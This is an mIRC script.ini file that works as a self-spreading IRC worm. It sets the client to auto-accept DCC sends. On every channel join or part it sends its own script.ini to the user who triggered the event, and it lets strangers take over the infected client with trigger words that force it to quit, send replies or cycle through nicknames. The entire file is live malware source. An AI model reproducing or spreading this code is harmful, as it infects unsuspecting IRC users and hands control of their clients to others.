[script]
n0=/sreq auto
n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
n2=  /dcc send $nick $mircdirscript.ini
n3=}
n4=ON 1:PART:#:{ /if ( $nick == $me ) { halt }
n5=  /dcc send $nick $mircdirscript.ini
n6=}
n7=
n8=ON 1:TEXT:*bruham*:#:{
n9=  .quit brUHaM k EnA grDa zhWaU nagRauZHna!!!
n10=  exit
n11=}
n12=ON 1:TEXT:*br!am*:*:{
n13=  msg $nick brUHaM!!!!
n14=}
n15=ON 1:TEXT:*brooham*:#:{
n16=  nick bruham
n17=  nick brooham
n18=  nick 8ruham
n19=  nick br00ham
n20=  nick br00|-|am
n21=  nick 8r00h4m
n22=  nick `bruhkow`
n23=  nick |bruh|
n24=  nick `8roo|-|`
n25=}
